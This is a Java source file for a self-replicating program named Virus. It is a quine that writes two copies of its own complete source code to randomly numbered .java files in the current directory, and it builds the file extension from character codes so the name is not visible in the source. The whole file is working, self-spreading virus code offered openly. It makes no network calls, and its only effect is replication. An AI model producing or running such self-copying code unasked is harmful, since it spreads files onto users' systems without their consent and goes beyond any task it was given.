import java.util.Random;
import java.io.PrintWriter;
import java.io.FileWriter;
import java.io.IOException;
class Virus
{
  public static void main(String[] args)
  {
    for (int repeat = 0; repeat < (1211242068% 3 + 2); repeat++) {
        char q = 34;      // Quotation mark character
        String[] l = {    // Array of source code
        "import java.util.Random;",
        "import java.io.PrintWriter;",
        "import java.io.FileWriter;",
        "import java.io.IOException;",
        "class Virus",
        "{",
        "  public static void main(String[] args)",
        "  {",
        "    for (int repeat = 0; repeat < (1211242068% 3 + 2); repeat++) {",
        "        char q = 34;      // Quotation mark character",
        "        String[] l = {    // Array of source code",
        "        ",
        "        };",
        "        try {",
        "        	Random random = new Random();",
        "        	String name = String.valueOf(random.nextInt(1000000));",
        "        	PrintWriter pw = new PrintWriter(new FileWriter(name.concat(String.valueOf((char)46)).concat(String.valueOf((char)106)).concat(String.valueOf((char)97)).concat(String.valueOf((char)118)).concat(String.valueOf((char)97))));",
        "            for(int i = 0; i < 11; i++)           // Print opening code",
        "        	    pw.println(l[i]);",
        "            for(int i = 0; i < l.length; i++)    // Print string array",
        "            	pw.println(l[11] + q + l[i] + q + ',');",
        "            for(int i = 12; i < l.length; i++)    // Print this code",
        "	            pw.println(l[i]);",
        "        	pw.close();",
        "        } catch (IOException e) {}",
        "    }",
        "  }",
        "}",
        };
        try {
        	Random random = new Random();
        	String name = String.valueOf(random.nextInt(1000000));
        	PrintWriter pw = new PrintWriter(new FileWriter(name.concat(String.valueOf((char)46)).concat(String.valueOf((char)106)).concat(String.valueOf((char)97)).concat(String.valueOf((char)118)).concat(String.valueOf((char)97))));
            for(int i = 0; i < 11; i++)           // Print opening code
        	    pw.println(l[i]);
            for(int i = 0; i < l.length; i++)    // Print string array
            	pw.println(l[11] + q + l[i] + q + ',');
            for(int i = 12; i < l.length; i++)    // Print this code
	            pw.println(l[i]);
        	pw.close();
        } catch (IOException e) {}
    }
  }
}
